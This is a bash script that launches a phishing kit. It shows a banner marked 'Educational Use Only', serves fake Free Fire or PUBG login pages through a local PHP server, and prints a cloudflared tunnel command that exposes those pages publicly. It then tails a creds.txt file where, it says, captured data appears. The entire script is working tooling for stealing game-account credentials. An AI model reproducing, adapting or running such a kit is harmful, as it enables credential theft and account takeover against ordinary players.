#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

trap 'printf "\n";stop' INT

stop() {
  pkill php > /dev/null 2>&1
  pkill cloudflared > /dev/null 2>&1
  exit 1
}

banner() {
  clear
  echo -e "${BLUE}"
  echo "█████╗ ████████╗██╗████████╗██████╗  █████╗  ██████╗ ███████╗"
  echo "██╔══██╗╚══██╔══╝██║╚══██╔══╝██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
  echo "███████║   ██║   ██║   ██║   ██████╔╝███████║██║  ███╗█████╗  "
  echo "██╔══██║   ██║   ██║   ██║   ██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
  echo "██║  ██║   ██║   ██║   ██║   ██║     ██║  ██║╚██████╔╝███████╗"
  echo "╚═╝  ╚═╝   ╚═╝   ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
  echo "                   ${NC}Educational Use Only"
  echo ""
}

menu() {
  echo -e "${YELLOW}[1] Free Fire"
  echo -e "[2] PUBG"
  echo -e "[3] Exit${NC}"
  echo ""
  read -p "Choose option: " site_option
}

server_menu() {
  echo ""
  echo -e "${YELLOW}[1] Localhost"
  echo -e "[2] Cloudflared (Manual)"
  echo -e "[3] Exit${NC}"
  echo ""
  read -p "Choose hosting method: " server_option
}

start_php_server() {
  echo -e "${GREEN}[*] Starting PHP server at http://127.0.0.1:8080${NC}"
  php -S 127.0.0.1:8080 > /dev/null 2>&1 &
}

start_cloudflared_note() {
  echo -e "${YELLOW}[!] Launching Cloudflared...${NC}"
  echo -e "${YELLOW}[!] Open a new terminal and run:${NC}"
  echo -e "${GREEN}./cloudflared tunnel --url http://127.0.0.1:8080${NC}"
}

run_site() {
  case $site_option in
    1)
      cd sites/freefire
      ;;
    2)
      cd sites/pubg
      ;;
    3)
      echo "Goodbye!"
      exit
      ;;
    *)
      echo -e "${RED}[!] Invalid option${NC}"
      exit 1
      ;;
  esac

  case $server_option in
    1)
      start_php_server
      ;;
    2)
      start_php_server
      start_cloudflared_note
      ;;
    3)
      echo "Goodbye!"
      exit
      ;;
    *)
      echo -e "${RED}[!] Invalid server option${NC}"
      exit 1
      ;;
  esac

  echo ""
  echo -e "${YELLOW}[+] Captured data will appear in creds.txt${NC}"
  echo -e "${YELLOW}[!] Press CTRL+C to stop${NC}"
  echo ""
  tail -f creds.txt
}

banner
menu
server_menu
run_site
